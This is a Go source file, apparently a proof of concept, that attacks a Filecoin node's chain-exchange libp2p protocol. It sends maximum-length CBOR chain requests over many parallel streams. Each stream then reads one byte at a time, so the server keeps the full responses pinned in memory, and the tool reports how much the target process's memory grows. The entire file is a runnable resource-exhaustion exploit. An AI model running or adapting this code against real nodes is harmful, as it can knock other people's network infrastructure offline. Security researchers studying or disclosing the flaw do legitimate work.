package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/peerstore"
	"github.com/multiformats/go-multiaddr"
)

const proto = "/fil/chain/xchg/0.0.1"

/// encodeReq builds CBOR-encoded Request{Head, Length, Options}
/// matches chain/exchange/cbor_gen.go MarshalCBOR format
func encodeReq(heads []cid.Cid, length, opts uint64) []byte {
	var b bytes.Buffer

	/// cbor array(3)
	b.WriteByte(0x83)

	/// heads: []cid.Cid
	b.WriteByte(0x80 | byte(len(heads)))
	for _, c := range heads {
		/// cid cbor tag(42) + identity multibase prefix
		b.Write([]byte{0xd8, 0x2a})
		cb := append([]byte{0x00}, c.Bytes()...)
		if len(cb) < 24 {
			b.WriteByte(0x40 | byte(len(cb)))
		} else {
			b.WriteByte(0x58)
			b.WriteByte(byte(len(cb)))
		}
		b.Write(cb)
	}

	/// length: uint64
	writeUint(&b, length)
	/// options: uint64
	writeUint(&b, opts)

	return b.Bytes()
}

func writeUint(w *bytes.Buffer, v uint64) {
	switch {
	case v < 24:
		w.WriteByte(byte(v))
	case v < 256:
		w.Write([]byte{0x18, byte(v)})
	case v < 65536:
		w.WriteByte(0x19)
		binary.Write(w, binary.BigEndian, uint16(v))
	default:
		w.WriteByte(0x1b)
		binary.Write(w, binary.BigEndian, v)
	}
}

/// getHead fetches chain head via JSON-RPC
/// parses CIDs from DAG-JSON format: {"/": "bafy..."}
func getHead(api string) ([]cid.Cid, error) {
	resp, err := http.Post(api, "application/json",
		strings.NewReader(`{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)

	/// parse DAG-JSON cid format {"/": "bafy..."}
	var r struct {
		Result struct {
			Cids []struct {
				Root string `json:"/"`
			} `json:"Cids"`
		} `json:"result"`
	}
	if err := json.Unmarshal(data, &r); err != nil {
		return nil, err
	}

	var cids []cid.Cid
	for _, c := range r.Result.Cids {
		parsed, err := cid.Decode(c.Root)
		if err != nil {
			return nil, err
		}
		cids = append(cids, parsed)
	}
	return cids, nil
}

/// getRSS reads VmRSS from /proc/pid/status (linux only)
func getRSS(pid int) int64 {
	if pid <= 0 {
		return 0
	}
	data, _ := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "VmRSS:") {
			v, _ := strconv.ParseInt(strings.Fields(line)[1], 10, 64)
			return v
		}
	}
	return 0
}

type result struct {
	ok       bool
	bytesIn  int
	duration time.Duration
}

/// attack opens stream, sends max-length request, stalls read to pin server memory
/// server builds full response then blocks on write for up to 60s (WriteResDeadline)
func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, stallSec int, out chan<- result) {
	r := result{}
	start := time.Now()

	s, err := h.NewStream(ctx, t, proto)
	if err != nil {
		out <- r
		return
	}
	defer s.Close()

	/// send request
	s.Write(req)
	s.CloseWrite()

	/// stall read: 1 byte per interval creates TCP backpressure
	/// server goroutine blocks on WriteCborRPC with full response in heap
	buf := make([]byte, 1)
	for {
		s.SetReadDeadline(time.Now().Add(time.Duration(stallSec) * time.Second))
		n, err := s.Read(buf)
		r.bytesIn += n
		if err != nil {
			break
		}
		/// slow drain keeps server blocked
		time.Sleep(time.Duration(stallSec) * time.Second)
	}

	r.ok = true
	r.duration = time.Since(start)
	out <- r
}

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid] [stall_sec]\n", os.Args[0])
		os.Exit(1)
	}

	api, addr, peerStr := os.Args[1], os.Args[2], os.Args[3]
	n, _ := strconv.Atoi(os.Args[4])
	pid := 0
	if len(os.Args) > 5 {
		pid, _ = strconv.Atoi(os.Args[5])
	}
	/// stall interval: seconds between each 1-byte read
	stallSec := 5
	if len(os.Args) > 6 {
		stallSec, _ = strconv.Atoi(os.Args[6])
	}

	heads, err := getHead(api)
	if err != nil {
		fmt.Fprintf(os.Stderr, "getHead: %v\n", err)
		os.Exit(1)
	}

	/// Length=900 (MaxRequestLength = policy.ChainFinality)
	/// Options=3 (Headers|Messages)
	req := encodeReq(heads, 900, 3)

	priv, _, _ := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	h, _ := libp2p.New(libp2p.Identity(priv))
	defer h.Close()

	ma, _ := multiaddr.NewMultiaddr(addr)
	target, _ := peer.Decode(peerStr)
	h.Peerstore().AddAddr(target, ma, peerstore.PermanentAddrTTL)

	ctx := context.Background()
	if err := h.Connect(ctx, peer.AddrInfo{ID: target, Addrs: []multiaddr.Multiaddr{ma}}); err != nil {
		fmt.Fprintf(os.Stderr, "connect: %v\n", err)
		os.Exit(1)
	}

	baseRSS := getRSS(pid)
	results := make(chan result, n)
	var wg sync.WaitGroup
	var peakRSS int64

	/// monitor RSS during attack
	done := make(chan struct{})
	go func() {
		tick := time.NewTicker(500 * time.Millisecond)
		defer tick.Stop()
		for {
			select {
			case <-tick.C:
				if rss := getRSS(pid); rss > atomic.LoadInt64(&peakRSS) {
					atomic.StoreInt64(&peakRSS, rss)
				}
			case <-done:
				return
			}
		}
	}()

	t0 := time.Now()
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attack(ctx, h, target, req, stallSec, results)
		}()
	}
	go func() { wg.Wait(); close(results) }()

	var ok, totalBytes int
	var totalDur time.Duration
	for r := range results {
		if r.ok {
			ok++
			totalBytes += r.bytesIn
			totalDur += r.duration
		}
	}
	close(done)

	finalRSS := getRSS(pid)
	peak := atomic.LoadInt64(&peakRSS)

	/// output
	fmt.Printf("streams: %d/%d\n", ok, n)
	fmt.Printf("bytes recv: %d total\n", totalBytes)
	fmt.Printf("time: %.1fs\n", time.Since(t0).Seconds())
	if pid > 0 && baseRSS > 0 {
		fmt.Printf("rss: %dM -> %dM (peak %dM, growth %dM)\n",
			baseRSS/1024, finalRSS/1024, peak/1024, (peak-baseRSS)/1024)
	}
}
